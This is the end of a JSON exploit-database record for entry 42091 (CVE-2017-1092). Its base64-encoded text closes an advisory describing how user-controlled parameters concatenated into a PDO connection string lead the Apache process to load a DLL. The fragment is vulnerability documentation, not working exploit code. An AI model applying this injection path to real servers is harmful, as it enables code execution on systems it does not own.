Lg0KDQphdCBbM10gYSBjb25uZWN0aW9uIHN0cmluZyBpcyBjb25jYXRlbmF0ZWQgd2l0aCB1c2VyLWNvbnRyb2xsZWQgcGFyYW1ldGVycw0KDQphdCBbNF0gUERPOjpfX2NvbnN0cnVjdCgpIGlzIGNhbGxlZCwgdGhlbiB0aGUgZGxsIGlzIGxvYWRlZCBieSB0aGUgQXBhY2hlIHByb2Nlc3Mu", 
    "filename": "platforms/windows/webapps/42091.txt", 
    "id": "42091", 
    "cves": [
        "CVE-2017-1092"
    ]
}